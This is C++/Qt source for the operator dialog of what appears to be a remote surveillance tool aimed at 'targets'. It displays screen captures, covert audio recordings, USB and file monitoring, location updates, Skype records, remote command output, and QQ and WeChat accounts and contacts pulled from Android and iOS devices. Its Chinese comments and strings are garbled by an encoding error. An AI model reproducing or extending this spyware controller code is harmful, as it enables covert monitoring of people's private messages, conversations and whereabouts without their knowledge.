void TargetDlg::on_WM_SET_TAR_STATUSINFO_W(MSG* msg)
{
	STATUS_LEVEL sl = (STATUS_LEVEL)msg->wParam;
	wchar_t *lpwzInfo = (wchar_t *)msg->lParam;

	wchar_t *lpPartInfo = wcschr(lpwzInfo, L']');
	if (lpPartInfo)
	{
		lpPartInfo++;
	}
	else
	{
		lpPartInfo = lpwzInfo;
	}

	ui.lbStatusBar->setText(QString::fromStdWString(std::wstring(lpPartInfo)));

	if ( !this->bLogInfo )
		return;

	m_logDetailDlg->AddDetail(lpPartInfo);
}

// ////////////////////////////////////////////////////////////////////////////////
// @private �µ��ļ�����
//
void TargetDlg::on_WM_NEW_FILETASK(MSG* msg)
{
	FileTask *fileTask = (FileTask *)msg->wParam;
	AddFileTaskToListView(fileTask);
}

// ////////////////////////////////////////////////////////////////////////////////
// @private �����ļ�����״̬
//
void TargetDlg::on_WM_UPT_FILETASK_STATUS(MSG* msg)
{
	FileTask *fileTask = (FileTask *)msg->wParam;

	// ���ڶ��Ŀ¼��Ϣ����ListItem״̬�ĸ�������DTK����ɵ�
	//

	if (fileTask->taskType == TASK_DIRINFO )
	{
		// DO Nothing
		//
		return;
	}

	int nDaeIndex, nFinishIndex;
	QTableWidgetItem* item = QueryFileTaskListItem(fileTask, &nDaeIndex, &nFinishIndex);
	if ( item )
	{
		if (nFinishIndex != -1)
		{
			if (fileTask->dwTotalLen > 0)
			{
				fileTask->nFinishedProp = (int)((double)fileTask->dwFinishedLen /(double)fileTask->dwTotalLen * 100);
				QTableWidgetItem* progress = item->tableWidget()->item(item->row(), nFinishIndex);
				progress->setText(QString("%1%").arg(fileTask->nFinishedProp));
			}
		}

		QTableWidgetItem* status = item->tableWidget()->item(item->row(), 0);
		QTableWidgetItem* remark = item->tableWidget()->item(
			item->row(), nFinishIndex + 1);

		switch(fileTask->taskStatus)
		{
		case WORKING:
			status->setText(QString::fromLocal8Bit("����"));
			break;
		case PAUSED:
			status->setText(QString::fromLocal8Bit("��ͣ"));
			break;

		case PAUSEDBYNET:
			status->setText(QString::fromLocal8Bit("��ͣ"));
			if ( remark )
				remark->setText(QString::fromLocal8Bit("������״̬�л����¸�������ͣ"));
			break;

		case ERRORED:
			if ( status )
				status->setText(QString::fromLocal8Bit("����"));
			if ( remark && fileTask )
				remark->setText(QString::fromStdWString(ConvertErrorIdToStrW(fileTask->dwErrorID)));

			status->setData(Qt::UserRole, NULL);
			break;

		case CANCELED:
			status->setText(QString::fromLocal8Bit("ȡ��"));
			status->setData(Qt::UserRole, NULL);
			if ( remark )
				remark->setText("");
			break;
		case FINISHED:
			status->setText(QString::fromLocal8Bit("���"));
			status->setData(Qt::UserRole, NULL);
			if ( remark )
				remark->setText("");
			break;
		}
	}
}

// ////////////////////////////////////////////////////////////////////////////////
// @private �����ļ��������
//
void TargetDlg::on_WM_UPT_FILETASK_PROGRESS(MSG* msg)
{
	FileTask *fileTask = (FileTask *)msg->wParam;

	if (FrmMain->bClosing)
	{
		return;
	}

	// @@ �������Ȳ�������
	/*if (fileTask->taskType == TASK_PLUGINDATA )
	{
		// DO Nothing
		//
		return;
	}*/

	// @@NOTE: ������Ŀ¼��Ϣ��ȡ�Ľ��ȸ���Ҳ��ͨ�õ�
	//
	int nDaeIndex, nFinishIndex;

	QTableWidgetItem* item = QueryFileTaskListItem(fileTask, &nDaeIndex, &nFinishIndex);

	if ( item )
	{

		if (nFinishIndex != -1)
		{
			if (fileTask->dwTotalLen > 0)
			{
				int nFinishedProp = (int)((double)fileTask->dwFinishedLen /(double)fileTask->dwTotalLen * 100);
				int nDaemonProp = (int)((double)fileTask->dwDaemonedLen /(double)fileTask->dwTotalLen * 100);
				if (nFinishedProp != fileTask->nFinishedProp
					|| nDaemonProp != fileTask->nDaemonedProp )
				{
					fileTask->nFinishedProp = nFinishedProp;
					fileTask->nDaemonedProp = nDaemonProp;
					QTableWidgetItem* progress = item->tableWidget()->item(item->row(), nFinishIndex);
					progress->setText(QString("%1%").arg(nFinishedProp));

					if ( nDaeIndex )
					{
						QTableWidgetItem* daemonProgress = item->tableWidget()->item(item->row(), nDaeIndex);
						daemonProgress->setText(QString("%1%").arg(nDaemonProp));
					}
				}
			}
		}
	}
}

// ////////////////////////////////////////////////////////////////////////////////
// @private �µ�Ŀ¼����
//
void TargetDlg::on_WM_NEW_DIRTASK(MSG* msg)
{
	DirTask *dirTask = (DirTask *)msg->wParam;

	AddDirTaskToListView(dirTask);
}

// ////////////////////////////////////////////////////////////////////////////////
// @private ����Ŀ¼����״̬
//
void TargetDlg::on_WM_UPT_DIRTASK_STATUS(MSG* msg)
{
	DirTask* dirTask = (DirTask *)msg->wParam;

	QTableWidget* table = NULL;

	if (dirTask->dwAutoDown == 0)
	{
		table = ui.tbDirInfoList;
	}
	else
	{
		table = ui.tbDirCommand;
	}

	// ���½���
	//
	int i = 0;
	QTableWidgetItem* item = NULL;
	for (; i < table->rowCount(); i++)
	{
		item = table->item(i, 0);

		if ( dirTask == (PDirTask)item->data(Qt::UserRole).toUInt() )
		{
			break;
		}
	}

	if (i < table->rowCount())
	{
		if (dirTask->dwAutoDown == 1)
		{
			ui.tbDirCommand->item(i, 4)->setText(QString("%1").arg(dirTask->dwWorkingCount));
			ui.tbDirCommand->item(i, 5)->setText(QString("%1").arg(dirTask->dwPausedCount));
			ui.tbDirCommand->item(i, 6)->setText(QString("%1").arg(dirTask->dwFinishedCount));
			ui.tbDirCommand->item(i, 7)->setText(QString("%1").arg(dirTask->dwCanceledCount));
			ui.tbDirCommand->item(i, 8)->setText(QString("%1").arg(dirTask->dwErroredCount));
		}

		switch(dirTask->taskStatus)
		{
		case WORKING:
			table->item(i, 0)->setText(QString::fromLocal8Bit("����"));
			break;
		case PAUSED:
			table->item(i, 0)->setText(QString::fromLocal8Bit("��ͣ"));
			break;
		case ERRORED:
			table->item(i, 0)->setText(QString::fromLocal8Bit("����"));
			table->item(i, table->columnCount()-1)->setText(QString::fromStdWString(ConvertErrorIdToStrW(dirTask->dwErrorID)));
			break;
		case CANCELED:
			table->item(i, 0)->setText(QString::fromLocal8Bit("ȡ��"));
			break;
		case FINISHED:
			table->item(i, 0)->setText(QString::fromLocal8Bit("���"));
			break;
		}

		if (dirTask->dwAutoDown == 1)
		{
			int selected = table->selectedItems().count();

			if ( 0 == selected )
			{
				return;
			}

			QTableWidgetItem* selectedItem = table->selectedItems().at(0);
			selectedItem = table->item(selectedItem->row(), 0);

			if ( item == selectedItem )
			{
				QTableWidgetItem* detailItem = NULL;
				PFileTask fileTask = NULL;
				i = 0;
				for (; i < ui.tbFileCommand->rowCount(); i++)
				{
					detailItem = ui.tbFileCommand->item(i, 0);
					fileTask = (PFileTask)detailItem->data(Qt::UserRole).toUInt();

					if (fileTask)
					{
						if (fileTask->taskStatus == WORKING)
						{
							if (dirTask->taskStatus == PAUSED || dirTask->taskStatus == CANCELED)
							{
								fileTask->taskStatus = dirTask->taskStatus;
							}
						}
						else if (fileTask->taskStatus == PAUSED)
						{
							if (dirTask->taskStatus == WORKING || dirTask->taskStatus == CANCELED)
							{
								fileTask->taskStatus = dirTask->taskStatus;
							}
						}

						switch(fileTask->taskStatus)
						{
						case WORKING:
							detailItem->setText(QString::fromLocal8Bit("����"));
							break;
						case PAUSED:
							detailItem->setText(QString::fromLocal8Bit("��ͣ"));
							break;
						case ERRORED:
							{
								detailItem->setText(QString::fromLocal8Bit("����"));
								QString des = QString::fromStdWString(ConvertErrorIdToStrW(fileTask->dwErrorID));
								ui.tbFileCommand->item(i, 7)->setText(des);
							}
							break;
						case CANCELED:
							detailItem->setText(QString::fromLocal8Bit("ȡ��"));
							break;
						case FINISHED:
							detailItem->setText(QString::fromLocal8Bit("���"));
							break;
						}
					}
				}
			}
		}
	}

	// ��������ͳ����Ϣ
	this->tarBlock->tarConn->Send_DTK(this->tarBlock->dwTargetID, dirTask->dwTaskID, true);
}

// ////////////////////////////////////////////////////////////////////////////////
// @private ����Ŀ¼����ͳ��
//
void TargetDlg::on_WM_UPT_DIRTASK_STATISTIC(MSG* msg)
{
	DirTask *dirTask = (DirTask *)msg->wParam;

	QTableWidget* table;
	if (dirTask->dwAutoDown == 0)
	{
		table = ui.tbDirInfoList;
	}
	else
	{
		table = ui.tbDirCommand;
	}

	// ���½���
	//
	int i = 0;
	QTableWidgetItem* item = NULL;
	for (; i < table->rowCount(); i++)
	{
		item = table->item(i, 0);

		if (dirTask == (PDirTask)item->data(Qt::UserRole).toUInt())
		{
			break;
		}
	}

	if (i < table->rowCount())
	{
		if (dirTask->dwAutoDown == 1)
		{
			ui.tbDirCommand->item(i, 4)->setText(QString("%1").arg(dirTask->dwWorkingCount));
			ui.tbDirCommand->item(i, 5)->setText(QString("%1").arg(dirTask->dwPausedCount));
			ui.tbDirCommand->item(i, 6)->setText(QString("%1").arg(dirTask->dwFinishedCount));
			ui.tbDirCommand->item(i, 7)->setText(QString("%1").arg(dirTask->dwCanceledCount));
			ui.tbDirCommand->item(i, 8)->setText(QString("%1").arg(dirTask->dwErroredCount));
		}

		switch(dirTask->taskStatus)
		{
		case WORKING:
			table->item(i, 0)->setText(QString::fromLocal8Bit("����"));
			break;
		case PAUSED:
			table->item(i, 0)->setText(QString::fromLocal8Bit("��ͣ"));
			break;
		case ERRORED:
			table->item(i, 0)->setText(QString::fromLocal8Bit("����"));
			table->item(i, table->columnCount()-1)->setText(QString::fromStdWString(ConvertErrorIdToStrW(dirTask->dwErrorID)));
			break;
		case CANCELED:
			table->item(i, 0)->setText(QString::fromLocal8Bit("ȡ��"));
			break;
		case FINISHED:
			table->item(i, 0)->setText(QString::fromLocal8Bit("���"));
			if ( 0 == dirTask->dwFinishedCount && dirTask->dwAutoDown )
				QMessageBox::information(
				this,
				QString::fromLocal8Bit("��ʾ"),
				QString::fromLocal8Bit("��Ŀ¼Ϊ��Ŀ¼���������κ��ļ�"));
			break;
		}
	}
}

// ////////////////////////////////////////////////////////////////////////////////
// @private �µ���������
//
void TargetDlg::on_WM_NEW_SEARCHTASK(MSG* msg)
{
	SearchTask *searchTask = (SearchTask *)msg->wParam;

	AddSearchTaskToListView(searchTask);
}

// ////////////////////////////////////////////////////////////////////////////////
// @private ������������״̬
//
void TargetDlg::on_WM_UPT_SEARCHTASK_STATUS(MSG* msg)
{

}

// ////////////////////////////////////////////////////////////////////////////////
// @private �ļ��������
//
void TargetDlg::on_WM_FILETASK_FINISHED(MSG* msg)
{
	FileTask *fileTask = (FileTask *)msg->wParam;

	// @@@ ��ǰ���ϴ���û�д���
	//
	if (fileTask->taskDirect == FILEDOWN)
	{
		if ( bFileControl )
			m_fileCtrlDlg->DownloadFileFinished(fileTask);
	}
}

// ////////////////////////////////////////////////////////////////////////////////
// @private ���� USB �ļ�
//
void TargetDlg::on_WM_UPDATE_USB_FILE(MSG* msg)
{
	if (this->bAdvanceFileMonitor == false)
	{
		return;
	}

	m_advanceMonitorDlg->UpdateUsbFile(msg);
}

// ////////////////////////////////////////////////////////////////////////////////
// @private ���� USB op
//
void TargetDlg::on_WM_UPDATE_USB_OP(MSG* msg)
{
	if (this->bAdvanceFileMonitor == false)
	{
		return;
	}

	m_advanceMonitorDlg->UpdateUsbOp(msg);
}

// ////////////////////////////////////////////////////////////////////////////////
// @private ���� https
//
void TargetDlg::on_WM_UPDATE_HTTPS(MSG* msg)
{

}

// ////////////////////////////////////////////////////////////////////////////////
// @private ���½���
//
void TargetDlg::on_WM_UPDATE_SCREEN(MSG* msg)
{
	if ( bScreen )
		m_captureDlg->UpdateScreen(msg);
}

// ////////////////////////////////////////////////////////////////////////////////
// @private ���´����б�
//
void TargetDlg::on_WM_UPDATE_LIRINFO(MSG* msg)
{
	if ( bFileControl )
		m_fileCtrlDlg->UpdateLirInfo();
}

// ////////////////////////////////////////////////////////////////////////////////
// @private ����Ŀ¼�б�
//
void TargetDlg::on_WM_UPDATE_DIRINFO(MSG* msg)
{
	wchar_t* lpwidPath = (wchar_t *)msg->wParam;
	this->nDirLastError = (int)msg->lParam;

	if (this->nDirLastError == 0)
	{
		if ( bFileControl )
			m_fileCtrlDlg->UpdateDirInformation(lpwidPath);
	}
}

// ////////////////////////////////////////////////////////////////////////////////
// @private ����������Ϣ
//
void TargetDlg::on_WM_UPDATE_SEARCHINFO(MSG* msg)
{
	//DM->QuerySearchList(tarBlock->dwTargetID, this->tvAdvFileControl, this->tNodeSearchHistory);
}

// ////////////////////////////////////////////////////////////////////////////////
// @private Զ��ִ��
//
void TargetDlg::on_WM_REMOTERUN_REDIRECT(MSG* msg)
{
	if ( bCmdConsole )
		m_remoteCmdDlg->RemoteCmdExec();
}

// ////////////////////////////////////////////////////////////////////////////////
// @private Զ��ִ�����
//
void TargetDlg::on_WM_REMOTERUN_OUTPUT(MSG* msg)
{
	if ( bCmdConsole )
		m_remoteCmdDlg->RemoteCmdOutput();
}

// ////////////////////////////////////////////////////////////////////////////////
// @private Զ��ִ�н���
//
void TargetDlg::on_WM_REMOTERUN_FINISHED(MSG* msg)
{
	if ( bCmdConsole )
		m_remoteCmdDlg->RemoteCmdFinished();
}

// ////////////////////////////////////////////////////////////////////////////////
// @private �������� -> found block
//
void TargetDlg::on_WM_ONLINESEARCH_FOUND_BLOCK(MSG* msg)
{
	if ( bFileControl )
		m_fileCtrlDlg->SearchStep(msg);
}

// ////////////////////////////////////////////////////////////////////////////////
// @private ������������
//
void TargetDlg::on_WM_ONLINESEARCH_FINISHED(MSG* msg)
{
	if ( bFileControl )
		m_fileCtrlDlg->SearchFinished(msg);
}

// ////////////////////////////////////////////////////////////////////////////////
// @private ������������
//
void TargetDlg::on_WM_ONLINESEARCH_ERRORED(MSG* msg)
{
	if ( bFileControl )
		m_fileCtrlDlg->SearchFailed(msg);
}

// ////////////////////////////////////////////////////////////////////////////////
// @private ��������
//
void TargetDlg::on_WM_CAPFULLSCREEN_FINISHED(MSG* msg)
{
	SetTarStatusInfoExW(STATUS_INFO,
		tarBlock,
		L"[Ŀ��%s(ID:%u)] �ɹ���ȡȫ��һ֡!",
		tarBlock->widTargetName.c_str(),
		tarBlock->dwTargetID);
}

// ////////////////////////////////////////////////////////////////////////////////
// @private �ɹ�����ļ�����
//
void TargetDlg::on_WM_FILEMONITOR_FINISHED(MSG* msg)
{
	std::wstring path = (LPCWSTR)msg->wParam;
	ULONG add = (ULONG)msg->lParam;
	
	if ( bAdvanceFileMonitor )
		if ( add )
			m_advanceMonitorDlg->AddMonitorItem(path);
		else
			m_advanceMonitorDlg->RemoveMonitorItem(path);

	if ( bFileControl )
		if ( add )
			m_fileCtrlDlg->SetItemMonitorFlag(true);
		else
			m_fileCtrlDlg->SetItemMonitorFlag(false);
}

// ////////////////////////////////////////////////////////////////////////////////
// @private �ļ�״̬�ı�
//
void TargetDlg::on_WM_FILEMONITOR_CHANGED(MSG* msg)
{
	if ( bAdvanceFileMonitor )
		m_advanceMonitorDlg->MonitorFileChanged(msg);
}

// ////////////////////////////////////////////////////////////////////////////////
// @private ��ȡ���µ� location
//
void TargetDlg::on_WM_NEW_LOCATION(MSG* msg)
{
	if ( bMapInfo )
		m_mapInfoDlg->GetNewLocation(msg);
}

// ////////////////////////////////////////////////////////////////////////////////
// @private �µ� Skype ��ؼ�¼
//
void TargetDlg::on_WM_NEW_SKYPE_RECORD(MSG* msg)
{
	if ( bMultimedia )
		m_multimediaDlg->RefreshSkypeData();
}

// ////////////////////////////////////////////////////////////////////////////////
// @private �µļ�ؼ�¼
//
void TargetDlg::on_WM_NEW_PLUGIN_DATA(MSG* msg)
{
	if ( bUserAction )
		m_userActionDlg->GetNewPluginData(msg);
}

// ////////////////////////////////////////////////////////////////////////////////
// @private �µĵ������������
//
void TargetDlg::on_WM_NEW_THIRD_PLUGIN_FILE(MSG* msg)
{
	if ( bThirdPlugin )
		m_thirdPluginDlg->GetNewPluginFile(msg);
}

// ////////////////////////////////////////////////////////////////////////////////
// @private �µ�¼��
//
void TargetDlg::on_WM_NEW_BACKSOUND(MSG* msg)
{
	if ( bRecord )
		m_recordDlg->GetNewRecordFile(msg);
}

// ////////////////////////////////////////////////////////////////////////////////
// @private ¼������
//
void TargetDlg::on_WM_BACKSOUND_SETTING(MSG* msg)
{
	if ( bRecord )
		m_recordDlg->GetNewSettingInfo(msg);
}

// ////////////////////////////////////////////////////////////////////////////////
// @private Ӧ��ȡ֤���
//
void TargetDlg::on_WM_APP_INFO_FINISHED(MSG* msg)
{
	if ( bAppInfo )
		m_appInfoDlg->Reload();
}

void TargetDlg::on_WM_APP_QQ_ACCOUNT( MSG* msg )
{
	if ( bAppInfo )
	{
		PDATA_BLOCK dataBlock = (PDATA_BLOCK)(msg->lParam);
		std::vector<std::string> & args = dataBlock->args;
		assert(args.size() == 4);

		std::wstring qqNumber = GetWideFromBase64(args[3]);
		m_appInfoDlg->InsertQQAccount(qqNumber);
	}
}

void TargetDlg::on_WM_APP_QQ_FRIEND( MSG* msg )
{
	if ( bAppInfo )
	{
		PDATA_BLOCK dataBlock = (PDATA_BLOCK)(msg->lParam);
		std::vector<std::string> & args = dataBlock->args;
		assert(args.size() == 9);
		std::wstring owner = GetWideFromBase64(args[3]);
		std::wstring friendNumber = GetWideFromBase64(args[4]);
		std::wstring friendNickName = GetWideFromBase64(args[5]);
		std::wstring remark = GetWideFromBase64(args[6]);
		std::wstring signature = GetWideFromBase64(args[7]);
		std::wstring group = GetWideFromBase64(args[8]);

		m_appInfoDlg->InsertQQFriend(owner, friendNumber, friendNickName, remark, signature, group);
	}
}

void TargetDlg::on_WM_APP_QQ_TROOP( MSG* msg )
{
	if ( bAppInfo )
	{
		PDATA_BLOCK dataBlock = (PDATA_BLOCK)(msg->lParam);
		std::vector<std::string> & args = dataBlock->args;
		assert(args.size() == 7);
		std::wstring owner = GetWideFromBase64(args[3]);
		std::wstring troopNumber = GetWideFromBase64(args[4]);
		std::wstring troopName = GetWideFromBase64(args[5]);
		std::wstring troopMemo = GetWideFromBase64(args[6]);

		m_appInfoDlg->InsertQQTroop(owner, troopNumber, troopName, troopMemo);
	}
}

void TargetDlg::on_WM_APP_WEIXIN_ACCOUNT( MSG* msg )
{
	if ( bAppInfo )
	{
		PDATA_BLOCK dataBlock = (PDATA_BLOCK)(msg->lParam);
		std::vector<std::string> & args = dataBlock->args;
		assert(args.size() == 5);
		std::wstring weixinId = GetWideFromBase64(args[3]);
		std::wstring nickName = GetWideFromBase64(args[4]);

		m_appInfoDlg->InsertWeixinAccount(weixinId, nickName);
	}
}

void TargetDlg::on_WM_APP_WEIXIN_FRIEND( MSG* msg )
{
	if ( bAppInfo )
	{
		PDATA_BLOCK dataBlock = (PDATA_BLOCK)(msg->lParam);
		std::vector<std::string> & args = dataBlock->args;
		assert(args.size() == 6);
		std::wstring weixinId = GetWideFromBase64(args[3]);
		std::wstring friendId = GetWideFromBase64(args[4]);
		std::wstring friendNickName = GetWideFromBase64(args[5]);

		m_appInfoDlg->InsertWeixinFrineds(weixinId, friendId, friendNickName);
	}
}

// ////////////////////////////////////////////////////////////////////////////////
// @public slot ��ȡӦ������
//
void TargetDlg::GetAppData()
{
	if ( !FrmMain->ctrOnlineFlag
		|| tarBlock->tarStatus != TARONLINE )
	{
		QMessageBox::information(
			this,
			QString::fromLocal8Bit("��ʾ"),
			QString::fromLocal8Bit("����״̬�²��ܻ�ȡӦ������!"));
		return;
	}

	if ( SYSTEM_ANDROID == tarBlock->m_sysType )
	{
		if ( bAppInfo )
			m_appInfoDlg->DisableGetData();
		tarBlock->AndroidDownloadAppDataDir();
	}

	if ( SYSTEM_IOS == tarBlock->m_sysType )
	{
		if ( bAppInfo )
			m_appInfoDlg->DisableGetData();
		
		tarBlock->IOSDownloadAppConfig();
	}
}

void TargetDlg::CleanAppData()
{
	DM->CleanAppData(tarBlock->dwTargetID);

	if ( bAppInfo )
		m_appInfoDlg->Reload();
}

void TargetDlg::ExportAppData()
{
	QString path = QFileDialog::getExistingDirectory(this, QString::fromLocal8Bit("ѡ����·��"));

	if ( path == "" )
		return;

	path.replace("/", "\\");

	ExportAppInfoDlg dlg(path, tarBlock->dwTargetID);
	dlg.exec();
}

void TargetDlg::UpdateCapturePolicy()
{
	if ( bScreen )
		m_captureDlg->UpdateCapturePolicy();
}

void TargetDlg::ModifyCapturePolicy()
{
	emitModifyCapturePolicy((unsigned int)tarBlock, 4);
}

void TargetDlg::InitTaskList()
{
	// Dir task
	const std::map<ULONG, DirTask*>& dirMap = tarBlock->GetDirTaskMap();
	std::map<ULONG, DirTask*>::const_iterator itd = dirMap.begin();

	while ( itd != dirMap.end() )
	{
		AddDirTaskToListView((*itd).second);
		++itd;
	}

	// File task
	const std::map<ULONG, FileTask*>& fileMap = tarBlock->GetFileTaskMap();

	std::map<ULONG, FileTask*>::const_iterator itf = fileMap.begin();

	while ( itf != fileMap.end() )
	{
		AddFileTaskToListView((*itf).second);
		++itf;
	}
}

void TargetDlg::RefreshOnlineLogInfo()
{
	emit emitRefreshOnlineLogInfo();
}


